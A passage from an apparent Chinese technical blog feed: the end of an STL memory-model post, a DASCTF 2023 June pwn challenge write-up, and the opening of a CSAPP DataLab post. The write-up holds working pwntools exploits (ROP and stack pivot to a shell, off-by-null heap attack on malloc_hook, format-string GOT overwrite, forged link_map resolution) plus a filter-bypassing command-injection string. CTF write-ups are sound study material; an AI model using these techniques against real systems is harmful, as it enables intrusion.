title="思考题2"></a>思考题2</h2><blockquote><p>为什么实现了uninitialized_xxx和copy/fill这样两组不同的函数</p></blockquote><ul><li><code>uninitialized_xx</code>函数，其内部会执行结构体的构造函数。该函数面向于<code>尚未进行初始化</code>的内存。</li><li>而没有“<code>uninitialized_</code>”前缀的函数，面向的是<code>已经初始化过</code>的内存。所以不需要再执行构造函数。</li></ul><p>对已包含元素的内存中调用uninitialized_copy,可能导致对象未析构,或者出现问题1同样的情况,如copy,因重载的赋值运算符未被调用而导致浅拷贝的发生.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309141803372.png"></p><h2 id="思考题3"><a href="#思考题3" class="headerlink" title="思考题3"></a>思考题3</h2><blockquote><p>理解每个容器的内存模型。</p></blockquote><ul><li>vector的内存模型是一个数组。</li><li>list的内存模型是一个带空结点的双向循环链表.</li><li>deque的内存模型是多个buffer缓冲区和管理buffer的map数组.</li><li>set,map的内存模型是平衡二叉树(红黑树)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 程序设计 </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL </tag>
            
            <tag> CPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2023六月挑战赛｜二进制专项 复现</title>
      <link href="/2023/07/20/DASCTF-2023-June-Binary-WP/"/>
      <url>/2023/07/20/DASCTF-2023-June-Binary-WP/</url>
      
        <content type="html"><![CDATA[<p>(<del>距上一次好好看题应该有两个月了吧….</del></p><span id="more"></span><h2 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>第一次看多线程的题.没开pie和canary.<br>主线程在开启一个子线程后开启沙盒只能使用read,write调用,然后是一个0x10字节的溢出.<br>子线程是一个write的无限循环.</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主线程禁掉了open,所以无法进行orw.由于子线程是在主线程开启沙箱前创建的,不受沙箱影响.所以最终是要在子线程中执行system.<br>要通过主线程的溢出劫持子线程的控制流,可以通过线程间共享的got表.将write的got表改为主线程中溢出的地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307161610872.png"></p><p>由于新线程的栈是mmap得到的,所以可以利用其与libc的固定偏移得到.在子线程上再进行栈迁移+rop.<br>(感觉这题的各种偏移巧妙得诡异)</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python">magic_read <span class="token operator">=</span> <span class="token number">0x4013AE</span>bss <span class="token operator">=</span> <span class="token number">0x404200</span>rdi <span class="token operator">=</span> <span class="token number">0x401483</span>rsi_r15 <span class="token operator">=</span> <span class="token number">0x401481</span> ret <span class="token operator">=</span> <span class="token number">0x4013c6</span>leave_ret <span class="token operator">=</span> <span class="token number">0x4013c5</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token triple-quoted-string string">'''set scheduler-locking oncb *0x4013AEthread 2c'''</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#主线程劫持子线程控制流</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_read<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rsi_r15<span class="token punctuation">,</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rdi<span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'sleep'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>bss<span class="token number">-8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>magic_read<span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#子线程栈迁移+rop</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>magic_read<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>thread_stack <span class="token operator">=</span> libc_base<span class="token number">-0x41f0</span>rdi_rbp <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x2a745</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>rdi_rbp<span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>thread_stack<span class="token number">-8</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Noka"><a href="#Noka" class="headerlink" title="Noka"></a>Noka</h2><p>任意地址读写没啥好说的.<br>学到一个trick就是改malloc的got表为一个可控返回值(read_num之类)的函数,再加上之后的read可以达成任意地址写.</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>验证身份,由于snprintf限制了长度0x20,可以将%s后面的.key顶出0x20外截断.</p><pre class=" language-python"><code class="language-python">io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'admin :'</span><span class="token punctuation">,</span>b<span class="token string">'..///////////////////flag'</span><span class="token punctuation">)</span></code></pre><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180900152.png"><br>然后是一个有过滤的命令拼接.<br>命令之间用’\n’截断,过滤了空格用’\t’分隔参数.<br>注意闭合%s前面的单引号.<br>由于长度限制最后flag用通配符.<br>缓冲区未初始化,所以可以多次写入\n.<br>最后命令是这样的: ‘\ncat\tfl*\n.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180911843.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180904864.png"></p><p>由于缓冲区未初始化,也可以在验证函数的栈帧里布置来绕开过滤.</p><h2 id="Approoooooooaching"><a href="#Approoooooooaching" class="headerlink" title="Approoooooooaching"></a>Approoooooooaching</h2><p>Brainfuck的VM(<del>其实到现在对VM的概念都很模糊</del>).<br>洞在执行的时候对v3没有下界检查,可以直接越界修改返回地址,partial overwrite到后门函数.</p><p>(下次一定记得先找后门,还有就是逆向时看个大概就行了,老是想着把每条语句都看懂…)</p><h2 id="can-you-find-me"><a href="#can-you-find-me" class="headerlink" title="can_you_find_me"></a>can_you_find_me</h2><p>2.27的offbynull,没有输出函数,限制free和malloc次数.有一点特殊的是null会写在chunk[size]的地方,也就是只与size有关而与输入长度无关,这也是之后能部分覆写unsortedbin的fd的原因.</p><p>常规流程了,我的布置用完了free的次数所以打malloc_hook</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>og <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># offbynull构造堆块重叠,部分覆写unsortedbin</span>    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    add<span class="token punctuation">(</span><span class="token number">0x4f0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#5</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x4c0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#1</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>    add<span class="token punctuation">(</span><span class="token number">0x2f</span><span class="token punctuation">,</span>b<span class="token string">'\x60\x07'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#3</span>    <span class="token comment" spellcheck="true"># 泄露地址</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#4</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#5</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"7e3"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            stdout <span class="token operator">=</span> addr<span class="token number">-131</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'1.'</span><span class="token punctuation">)</span>    leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">,</span>stdout<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span>malloc_hook_addr<span class="token number">-0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>og<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io,</span><span class="token triple-quoted-string string">'''    # breakrva 0xDA4    # '''</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">520</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token operator">+</span>binary<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span></code></pre><h2 id="Candy-Shop"><a href="#Candy-Shop" class="headerlink" title="Candy_Shop"></a>Candy_Shop</h2><p>两次参数长度8字节的格式化字符串,一次数组越界bss段之前任意写.<br>先泄露地址,改printf的got表为system,完事.</p><pre class=" language-python"><code class="language-python">io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option:'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'%31$p'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'gift:'</span><span class="token punctuation">)</span>leak_libc<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option:'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'bye:'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'in?'</span><span class="token punctuation">,</span><span class="token string">'-10'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h2><p>2.23堆溢出,没啥特别的</p><h2 id="fooooood"><a href="#fooooood" class="headerlink" title="fooooood"></a>fooooood</h2><p>bss段格式化字符串,改返回地址和参数就行了<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307211003955.png"><br>(这题不能改printf的got表因为不能一次性改完,下一次执行printf的时候会崩)</p><h2 id="matchmaking-platform"><a href="#matchmaking-platform" class="headerlink" title="matchmaking platform"></a>matchmaking platform</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞点在sub_12B7函数,该函数向a1指向空间最多读取128字节(向buf读入了129次),进入最后一次循环时,v3==127,++v3溢出到-0x80,即向a1-0x80地址写一个字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292212184.png"><br>程序的主逻辑,配合上该漏洞,可以在times为4,2时修改byte_4140-0x80位置的pptr的低字节,使*pptr的新值为另一个地址,进而在times为3,1的时候在该地址进行写入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292223923.png"><br>于是寻找0x4000-0x4100内的指针,有GOT表和bss段的IO指针.</p><p>则可以先通过IO指针泄露pie基址并在byte_4140上伪造.dynamic以及strtab,再修改linkmap中l_info[5]为伪造的.dynamic,修改l_addr使其偏移.</p><p>使得解析free函数时得到system函数地址,且由于伪造的linkmap中l_addr(程序基地址)加上了偏移使得最终将system地址写入puts的GOT表条目.最终getshell.</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">128</span><span class="token operator">+</span>b<span class="token string">'\x80'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0xfbad1800</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>b<span class="token string">'\xb0\x5d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"0x56"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pie_base <span class="token operator">=</span> addr<span class="token number">-0x40a0</span>        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pie_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> b<span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pie_base<span class="token operator">+</span><span class="token number">0x4140</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">0x77</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true">#0x77是free字符串在strtab中的偏移</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'\x08'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pie_base<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pie_base<span class="token operator">+</span><span class="token number">0x4140</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io,</span><span class="token triple-quoted-string string">'''    # b *$rebase(0x1338)    # '''</span><span class="token punctuation">)</span>        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./'</span><span class="token operator">+</span>binary<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span></code></pre><p>(剩余题目之后单独放)</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Labs</title>
      <link href="/2023/06/26/CSAPP-Labs/"/>
      <url>/2023/06/26/CSAPP-Labs/</url>
      
        <content type="html"><![CDATA[<p>记录CSAPP Lab的一些过程和心得,由于刚开始接触计算机其实完成的质量不高.</p><span id="more"></span><h1 id="Lab1-DataLab"><a href="#Lab1-DataLab" class="headerlink" title="Lab1:DataLab"></a>Lab1:DataLab</h1><p>用位运算实现一些基本操作</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*  * CS:APP Data Lab  *  * &lt;Please put your name and userid here> *  * bits.c - Source file with your solutions to the Lab. *          This is the file you will hand in to your instructor. * * WARNING: Do not include the &lt;stdio.h> header; it confuses the dlc * compiler. You can still use printf for debugging without including * &lt;stdio.h>, although you might get a compiler warning. In general, * it's not good practice to ignore compiler warnings, but in this * case it's OK.   */</span><span class="token macro property">#<span class="token directive keyword">if</span> 0</span><span class="token comment" spellcheck="true">/* * Instructions to Students: * * STEP 1: Read the following instructions carefully. */</span>You will provide your solution to the Data Lab byediting the collection of functions in this source file<span class="token punctuation">.</span>INTEGER CODING RULES<span class="token punctuation">:</span>   Replace the <span class="token string">"return"</span> statement in each function with one  or more lines of C code that implements the function<span class="token punctuation">.</span> Your code   must conform to the following style<span class="token punctuation">:</span>   <span class="token keyword">int</span> <span class="token function">Funct</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* brief description of how your implementation works */</span>      <span class="token keyword">int</span> var1 <span class="token operator">=</span> Expr1<span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token keyword">int</span> varM <span class="token operator">=</span> ExprM<span class="token punctuation">;</span>      varJ <span class="token operator">=</span> ExprJ<span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      varN <span class="token operator">=</span> ExprN<span class="token punctuation">;</span>      <span class="token keyword">return</span> ExprR<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  Each <span class="token string">"Expr"</span> is an expression using ONLY the following<span class="token punctuation">:</span>  <span class="token number">1</span><span class="token punctuation">.</span> Integer constants <span class="token number">0</span> through <span class="token function">255</span> <span class="token punctuation">(</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">,</span> inclusive<span class="token punctuation">.</span> You are      not allowed to use big constants such as <span class="token number">0xffffffff</span><span class="token punctuation">.</span>  <span class="token number">2</span><span class="token punctuation">.</span> Function arguments and local <span class="token function">variables</span> <span class="token punctuation">(</span>no global variables<span class="token punctuation">)</span><span class="token punctuation">.</span>  <span class="token number">3</span><span class="token punctuation">.</span> Unary integer operations <span class="token operator">!</span> <span class="token operator">~</span>  <span class="token number">4</span><span class="token punctuation">.</span> Binary integer operations <span class="token operator">&amp;</span> <span class="token operator">^</span> <span class="token operator">|</span> <span class="token operator">+</span> <span class="token operator">&lt;&lt;</span> <span class="token operator">>></span>      Some of the problems restrict the set of allowed operators even further<span class="token punctuation">.</span>  Each <span class="token string">"Expr"</span> may consist of multiple operators<span class="token punctuation">.</span> You are not restricted to  one operator per line<span class="token punctuation">.</span>  You are expressly forbidden to<span class="token punctuation">:</span>  <span class="token number">1</span><span class="token punctuation">.</span> Use any control constructs such as <span class="token keyword">if</span><span class="token punctuation">,</span> <span class="token keyword">do</span><span class="token punctuation">,</span> <span class="token keyword">while</span><span class="token punctuation">,</span> <span class="token keyword">for</span><span class="token punctuation">,</span> <span class="token keyword">switch</span><span class="token punctuation">,</span> etc<span class="token punctuation">.</span>  <span class="token number">2</span><span class="token punctuation">.</span> Define or use any macros<span class="token punctuation">.</span>  <span class="token number">3</span><span class="token punctuation">.</span> Define any additional functions in this file<span class="token punctuation">.</span>  <span class="token number">4</span><span class="token punctuation">.</span> Call any functions<span class="token punctuation">.</span>  <span class="token number">5</span><span class="token punctuation">.</span> Use any other operations<span class="token punctuation">,</span> such as <span class="token operator">&amp;&amp;</span><span class="token punctuation">,</span> <span class="token operator">||</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token punctuation">,</span> or <span class="token operator">?</span><span class="token punctuation">:</span>  <span class="token number">6</span><span class="token punctuation">.</span> Use any form of casting<span class="token punctuation">.</span>  <span class="token 